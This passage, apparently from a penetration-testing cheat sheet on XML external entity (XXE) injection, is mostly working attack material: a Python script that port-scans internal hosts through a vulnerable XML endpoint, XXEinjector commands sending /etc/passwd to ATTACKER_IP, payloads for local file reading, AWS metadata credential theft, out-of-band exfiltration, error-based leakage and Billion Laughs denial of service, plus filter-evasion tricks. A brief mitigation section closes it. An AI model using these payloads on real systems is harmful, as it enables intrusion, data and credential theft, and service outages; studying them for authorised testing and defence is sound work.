import requests
import time

target = "https://example.com/api/xml"
internal_ip = "192.168.1.100"
ports = [21, 22, 23, 25, 80, 443, 3306, 5432, 6379, 8080, 8443, 9200]

for port in ports:
    payload = f'''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://{internal_ip}:{port}/">
]>
<root>&xxe;</root>'''

    try:
        t0 = time.time()
        resp = requests.post(target, data=payload, timeout=10,
                             headers={"Content-Type": "application/xml"})
        elapsed = time.time() - t0

        body = resp.text.lower()
        if "connection refused" in body:
            status = "CLOSED"
        elif elapsed > 8:
            status = "FILTERED (timeout)"
        else:
            status = f"OPEN ({elapsed:.2f}s)"

        print(f"[{port}] {status}")

    except requests.Timeout:
        print(f"[{port}] FILTERED (timeout)")
    except Exception as e:
        print(f"[{port}] ERROR: {e}")
```

Open ports typically return quickly with some application-level content or an error referencing the service. Closed ports return `Connection refused` almost instantly. Filtered ports time out. The pattern is parser-dependent; Java parsers tend to produce the most informative error messages.

---

## Automated XXE Exploitation with XXEinjector

For complex OOB scenarios, manual payload construction becomes tedious. [XXEinjector](https://github.com/enjoiz/XXEinjector) automates OOB XXE exploitation and file enumeration.

```bash
# Install
git clone https://github.com/enjoiz/XXEinjector.git
cd XXEinjector

# Basic file enumeration using OOB via HTTP
ruby XXEinjector.rb --host=ATTACKER_IP --httpport=8000 \
  --file=/path/to/request.txt --path=/etc/passwd --oob=http

# Enumerate all files in a directory
ruby XXEinjector.rb --host=ATTACKER_IP --httpport=8000 \
  --file=/path/to/request.txt --path=/etc/ --oob=http --enumerate

# Using FTP for OOB
ruby XXEinjector.rb --host=ATTACKER_IP --ftpport=21 \
  --file=/path/to/request.txt --path=/etc/passwd --oob=ftp
```

The `request.txt` file is a raw HTTP request with `XXEINJECT` as a placeholder in the XML body where XXEinjector will inject its payload. Capture the request from Burp, replace the XML content field value with `XXEINJECT`, and save it.

---

## Payload Quick-Reference

### Confirm Entity Processing

```xml
<?xml version="1.0"?>
<!DOCTYPE test [<!ENTITY x "XXE-CANARY">]>
<root><f>&x;</f></root>
```

### Basic LFI

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY f SYSTEM "file:///etc/passwd">]>
<root><f>&f;</f></root>
```

### LFI with PHP Base64 Filter

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY f SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">]>
<root><f>&f;</f></root>
```

### SSRF to AWS Metadata

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY s SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>
<root><f>&s;</f></root>
```

### Blind OOB (inline, with PHP Base64)

```xml
<?xml version="1.0"?>
<!DOCTYPE d [
  <!ENTITY % f SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
  <!ENTITY % e "<!ENTITY &#x25; o SYSTEM 'http://ATTACKER_IP:8000/?d=%f;'>">
  %e; %o;
]>
<root><f>x</f></root>
```

### Blind OOB via External DTD

```xml
<!-- attacker.dtd -->
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY exfil SYSTEM 'http://ATTACKER_IP:8000/?d=%file;'>">
```

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % r SYSTEM "http://ATTACKER_IP:8000/attacker.dtd">
  %r; %oob;
]>
<root><f>&exfil;</f></root>
```

### Error-Based Exfiltration

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % f SYSTEM "file:///etc/passwd">
  <!ENTITY % e "<!ENTITY &#x25; err SYSTEM 'file:///nonexistent/%f;'>">
  %e; %err;
]>
<root><f>x</f></root>
```

### XInclude LFI

```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</root>
```

### Billion Laughs DoS

```xml
<?xml version="1.0"?>
<!DOCTYPE x [
  <!ENTITY a "lol">
  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
  <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
  <!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">
  <!ENTITY e "&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;">
  <!ENTITY f "&e;&e;&e;&e;&e;&e;&e;&e;&e;&e;">
  <!ENTITY g "&f;&f;&f;&f;&f;&f;&f;&f;&f;&f;">
  <!ENTITY h "&g;&g;&g;&g;&g;&g;&g;&g;&g;&g;">
  <!ENTITY i "&h;&h;&h;&h;&h;&h;&h;&h;&h;&h;">
]>
<x>&i;</x>
```

---

## WAF Evasion and Encoding

Basic keyword-based filters may block `DOCTYPE`, `SYSTEM`, `ENTITY`, or `PUBLIC`. Standard evasion approaches:

**Swap `SYSTEM` for `PUBLIC`:**

```xml
<!ENTITY ext PUBLIC "irrelevant" "file:///etc/passwd">
```

**Case variation (some parsers accept mixed case):**

```xml
<!DoCtYpE root [<!eNtItY f SyStEm "file:///etc/passwd">]>
```

**XML encoding of the `%` character:**

In payloads using nested parameter entity declarations, the inner `%` must be entity-encoded as `&#x25;`. This is a required part of correct XML syntax, not just an evasion trick — and it also bypasses filters that scan for literal `%` characters in entity declarations.

**Protocol substitution for `file://`:**

If `file://` is blocked, try:

```xml
<!ENTITY f SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
```

**Content-Type switching:**

If JSON endpoints are not visibly vulnerable, try re-submitting with `Content-Type: application/xml` and a well-formed XML body. Some applications route based on content type and may invoke a vulnerable XML parser for the same data.

---

## Impact Summary

|Impact Class|Mechanism|Conditions|
|---|---|---|
|Arbitrary File Read (LFI)|`file://` external entity|Parser resolves `file://`; process has read access|
|SSRF|`http://` external entity|Parser resolves `http://`; outbound connections permitted|
|Blind SSRF / OOB exfil|Parameter entity + nested HTTP callback|OOB connections to attacker server permitted|
|Internal network access|SSRF through internal `http://` URIs|Internal routing reachable from server process|
|Cloud credential theft|SSRF to metadata endpoint|Cloud-hosted target; IMDSv1 not disabled|
|RCE|PHP `expect://` wrapper|PECL Expect extension installed|
|RCE via key theft|LFI of SSH private key|SSH key present and access authorized|
|DoS|Billion Laughs / quadratic blowup|No entity expansion limits|
|Error-based exfil|Nested entity error path injection|Parser produces path-inclusive error messages|

---

## Defensive Context (Know What You're Bypassing)

Understanding mitigations sharpens your testing approach — if a mitigation is in place but misconfigured, you need to know what to look for.

- **Disable external entity processing in the parser** — the only reliable fix. Every parser has a specific flag: `FEATURE_SECURE_PROCESSING` in Java JAXP, `libxml_set_external_entity_loader(null)` in PHP, `XmlReaderSettings.DtdProcessing = DtdProcessing.Prohibit` in .NET.
- **Disable DTD processing entirely** — stronger than just disabling external entities; eliminates the Billion Laughs vector as well.
- **Input validation** — filtering `DOCTYPE` from input is insufficient. It can be bypassed via XInclude, XSLT, file upload vectors, and content-type switching.
- **Least privilege** — the web server process should not have read access to `/etc/passwd`, `/etc/shadow`, SSH keys, or application config outside the web root. This limits LFI impact without addressing the root cause.
- **Outbound firewall rules** — blocking the server from making outbound HTTP connections eliminates standard OOB exfiltration. Blind XXE via error messages remains possible.

> [!note] WAFs and input filters that block `DOCTYPE`, `SYSTEM`, or `ENTITY` keywords should be treated as speed bumps, not security boundaries. XInclude, XSLT processing, and file upload paths bypass them entirely.